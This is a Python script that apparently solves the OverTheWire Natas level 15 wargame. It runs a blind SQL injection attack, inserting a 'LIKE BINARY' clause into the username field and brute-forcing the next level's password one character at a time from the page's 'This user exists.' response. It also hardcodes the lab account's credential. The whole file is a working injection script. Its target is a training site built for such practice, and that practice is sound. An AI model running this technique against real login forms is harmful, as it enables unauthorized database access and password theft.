#!/usr/bin/python3

import os
import string

import requests
from requests.auth import HTTPBasicAuth


def main():
    URL = 'http://natas15.natas.labs.overthewire.org/index.php?debug=true'
    AUTH = HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
    PARAMS = {'debug': 'true'}
    PASSWORD_CHARS = ''.join(filter(str.isalnum, string.printable))

    password = ""
    finding_password = True
    while finding_password:
        found_next_character = False
        for c in PASSWORD_CHARS:
            guess = password + c
            username = "natas16\" AND password LIKE BINARY \'" + guess + "%\' \""
            r = requests.post(URL, auth=AUTH, data={'username': username}, params=PARAMS)
            html_body = str(r.content, encoding='ascii')

            if html_body.find("This user exists.") != -1:
                password += c
                found_next_character = True
                break

        print(password)

        if not found_next_character:
            finding_password = False


if __name__ == '__main__':
    main()
